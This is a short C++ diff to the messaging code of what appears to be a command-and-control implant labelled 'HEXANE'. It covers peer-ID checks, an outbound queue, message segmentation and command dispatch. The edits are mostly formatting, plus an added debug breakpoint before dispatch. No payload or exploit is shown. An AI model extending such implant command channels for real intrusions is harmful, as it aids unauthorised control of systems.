@@ -13,11 +13,12 @@ namespace Message {
         HEXANE
 
         UINT Pid = 0;
-        x_memcpy(&Pid, Stream->Buffer, 4);
 
+        x_memcpy(&Pid, Stream->Buffer, 4);
         if (x_memcmp(&Ctx->Session.PeerId, &Pid, 4) == 0) {
             return TRUE;
         }
+
         return FALSE;
     }
 
@@ -28,7 +29,6 @@ namespace Message {
 
         if (!Ctx->Transport.OutboundQueue) {
             Ctx->Transport.OutboundQueue = Outbound;
-
         } else {
             while (Head->Next) {
                 Head = Head->Next;
@@ -110,11 +110,11 @@ namespace Message {
         HEXANE
 
         PSTREAM Queue   = { };
-        ULONG Index     = 1;
         ULONG Offset    = 0;
         ULONG PeerId    = 0;
         ULONG TaskId    = 0;
         ULONG cbSeg     = 0;
+        ULONG Index     = 1;
         ULONG nSegs     = (Length + MESSAGE_MAX - 1) / MESSAGE_MAX;
 
         while (Length > 0) {
@@ -160,15 +160,12 @@ namespace Message {
 
         } else {
             Head = Ctx->Transport.OutboundQueue;
-
             while (Head) {
                 if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
                     break;
                 }
-
                 if (Head->Buffer) {
                     Parser::CreateParser(&Parser, S_CAST(PBYTE, Head->Buffer), Head->Length);
-
                     Stream::PackDword(Outbound, Head->PeerId);
                     Stream::PackDword(Outbound, Head->TaskId);
                     Stream::PackDword(Outbound, Head->MsgType);
@@ -206,6 +203,7 @@ namespace Message {
             ClearQueue();
 
             if (PeekPID(Inbound)) {
+                __debugbreak();
                 CommandDispatch(Inbound);
                 Stream::DestroyStream(Inbound);
             }
